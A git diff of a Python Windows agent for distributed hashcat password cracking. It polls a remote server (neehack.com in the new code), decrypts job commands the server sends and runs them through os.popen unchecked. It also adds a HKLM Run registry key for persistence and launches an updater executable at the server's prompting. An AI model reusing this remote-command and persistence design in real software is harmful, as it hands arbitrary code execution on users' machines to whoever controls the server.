@@ -3,11 +3,15 @@ from winregistry import WinRegistry as Reg
 import json
 import simplecrypt
 import base64
-import os
+import os, sys
 import time
 import threading
 from pathlib import Path
-
+from inspect import getsourcefile
+from os.path import abspath
+import inspect
+import configparser
+import subprocess
 
 GlobalAstatus = "Available"
 
@@ -24,8 +28,20 @@ def LastNlines(fname, N):
 
 
 def executeHascat(command, AgentID):
-    os.popen("cd hashcat & " + command).read()
-    exit(1)
+    path = os.path.abspath(os.path.dirname(sys.argv[0]))
+    if(path[:1] != os.getcwd()[:1]):
+        os.chdir(path[:2])
+        os.chdir(path)
+    os.chdir("hashcat")
+    os.popen(command)
+    os.chdir("../")
+
+def changeDir():
+    path = os.path.abspath(os.path.dirname(sys.argv[0]))
+    if (path[:1] != os.getcwd()[:1]):
+        os.chdir(path[:2])
+        os.chdir(path)
+    return os.getcwd()
 
 def hashcatError(AgentID, report):
     url = serverIP + "api?call=crack"
@@ -37,9 +53,7 @@ def hashcatError(AgentID, report):
     global GlobalAstatus
     GlobalAstatus = "Unable"
     r = requests.post(url=url, data=data)
-    print(r.text)
-
-    exit(1)
+    return 0
 
 
 def AgentStatus(AgentID):
@@ -55,58 +69,46 @@ def AgentStatus(AgentID):
                 "agentid": AgentID
             }
             r = requests.post(url=url, data=data)
-            jsonData = json.loads(r.text)
+            jsonData = ""
+            try:
+                jsonData = json.loads(r.text)
+            except:
+                print("[-] Something went wrong")
+            if(jsonData != ""):
+                for key, value in jsonData.items():
+                    if("action" == key):
+                        print("[+] Status: "+jsonData['status'])
+                        value = value[2:]
+                        value = value[:-1]
+                        value = bytes(value, encoding="utf-8")
+                        actionb64Decode = base64.b64decode(value)
+                        print("[+] Decrypting Hash")
+                        try:
+                            decryptData = simplecrypt.decrypt(AgentID, actionb64Decode).decode('utf-8')
+                            jsonData = json.loads(decryptData)
+                            if(jsonData['attacktype'] == "dictionary" and jsonData['command'] != None):
+                                command = jsonData['command']
+                                for root, dirs, files in os.walk("wordlists"):
+                                    for name in files:
+                                        if name.endswith(".txt"):
+                                            command = command+" ..\\"+os.path.join(root,name)
+                                command = command+" > result.log"
+                                t = threading.Thread(target=executeHascat, name="Recovering hash",
+                                                     args=(command, AgentID,))
 
-            for key, value in jsonData.items():
-                if("action" == key):
-                    print("[+] Status: "+jsonData['status'])
-                    value = value[2:]
-                    value = value[:-1]
-                    value = bytes(value, encoding="utf-8")
-                    actionb64Decode = base64.b64decode(value)
-                    print("[+] Decrypting Hash")
-                    try:
-                        decryptData = simplecrypt.decrypt(AgentID, actionb64Decode).decode('utf-8')
-                        jsonData = json.loads(decryptData)
-                        if(jsonData['attacktype'] == "dictionary" and jsonData['command'] != None):
-                            print("Dictionary Attack")
-                            command = jsonData['command']
-                            for root, dirs, files in os.walk("wordlists"):
-                                for name in files:
-                                    if name.endswith(".txt"):
-                                        command = command+" ..\\"+os.path.join(root,name)
-                            command = command+" > result.log"
-                            t = threading.Thread(target=executeHascat, name="Recovering hash",
-                                                 args=(command, AgentID,))
+                                hash = jsonData['hash']
+                                t.daemon = True
+                                t.start()
+                                wasCracking = True
+                            elif(jsonData['attacktype'] == "bruteforce" and jsonData['command'] != None):
+                                print("[+] Recovering password")
+                                t = threading.Thread(target=executeHascat, name="Recovering hash", args=(jsonData['command'],AgentID,))
 
-                            hash = jsonData['hash']
-                            t.daemon = True
-                            t.start()
-                            wasCracking = True
-                        elif(jsonData['attacktype'] == "bruteforce" and jsonData['command'] != None):
-                            print("[+] Recovering password")
-                            t = threading.Thread(target=executeHascat, name="Recovering hash", args=(jsonData['command'],AgentID,))
-
-                            hash = jsonData['hash']
-                            t.daemon = True
-                            t.start()
-                            status = ""
-
-                            #lines = LastNlines("result.log", 50)
-
-                            if("Status...........: Cracked" in status):
-                                encryptedLog = simplecrypt.encrypt(AgentID, status)
-                                encryptedB64 = base64.b64encode(encryptedLog)
-                                data = {
-                                    "status": GlobalAstatus,
-                                    "agentid": AgentID,
-                                    "log": encryptedB64,
-                                    "hash": jsonData['hash']
-                                }
-                                r = requests.post(url=url, data=data)
-
-                    except simplecrypt.DecryptionException:
-                        print("Bad Agent")
+                                hash = jsonData['hash']
+                                t.daemon = True
+                                t.start()
+                        except simplecrypt.DecryptionException:
+                            print("Bad Agent")
         else:
             if(wasCracking):
                 CrackResult(AgentID, hash, url)
@@ -121,7 +123,6 @@ def AgentStatus(AgentID):
                 }
                 r = requests.post(url=url, data=data)
                 lines = LastNlines("result.log", 10)
-                print(lines)
 
 
 def CrackResult(AgentID, hash, url):
@@ -144,14 +145,50 @@ def CrackResult(AgentID, hash, url):
                 }
                 r = requests.post(url=url, data=data)
             else:
-                print("Error")
                 hashcatError(AgentID, f.read())
         finally:
             f.close()
     except IOError:
-        print("In Progress")
+        print("[+] In Progress")
+
+def agentVersion():
+    config = configparser.ConfigParser()
+    config.read("version.ini")
+    agentversion = config.get("configuration", "agentversion")
+    dictionaryversion = config.get("configuration", "dictionaryversion")
+    hashcatversion = config.get("configuration", "hashcatversion")
+    url = serverIP + "api?call=crack&request=version"
+    r = requests.get(url=url)
+    jsonData = ""
+
+    currentDir = changeDir()
+
+    newUpdate = False
+    try:
+        jsonData = r.json()
+        print("[+] Checking for new update")
+        if(agentversion != jsonData['agentversion']):
+            newUpdate = True
+
+        if(dictionaryversion != jsonData['dictionaryversion']):
+            newUpdate = True
+
+        if (hashcatversion != jsonData['hashcatversion']):
+            newUpdate = True
+
+        if(newUpdate):
+            subprocess.Popen("updater.exe")
+
+        return 0
+    except:
+        print("[-] Failed to check for new update")
+        return -1
+    if(jsonData != ""):
+        print("[-] Could not read server response")
+        return -1
 
 def main():
+    agentVersion()
     reg = Reg()
     keyPath = r"HKLM\Software"
     newInstal = 1
@@ -164,13 +201,21 @@ def main():
             newInstal = 1
 
     if(newInstal):
-        url = serverIP+"api?crack=install&o=zlsdkfLAAzd388x879378zs3szasfkFJK"
+        url = serverIP+"api?call=crack&request=install&o=zlsdkhLbAzdz88xx79r783s3vzanfmzz3"
         r = requests.get(url=url)
-        jsonData = r.json()
+        jsonData = ""
+        try:
+            jsonData = r.json()
+        except:
+            print("[-] Something went wrong")
+
         reg.create_key(keyPath+r"\NAgent")
+        #HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
         reg.write_value(keyPath+r"\NAgent", 'NAgentID', jsonData['AgentID'], 'REG_SZ')
+        currentDir = os.getcwd()
+        reg.write_value(keyPath+r"\Microsoft\Windows\CurrentVersion\Run", 'NAgent', currentDir+r'\NAgent.exe', 'REG_SZ')
         AgentStatus(jsonData['AgentID'])
 
+serverIP = "http://www.neehack.com/"
 
-serverIP = "http://10.0.0.97:8000/"
 main()
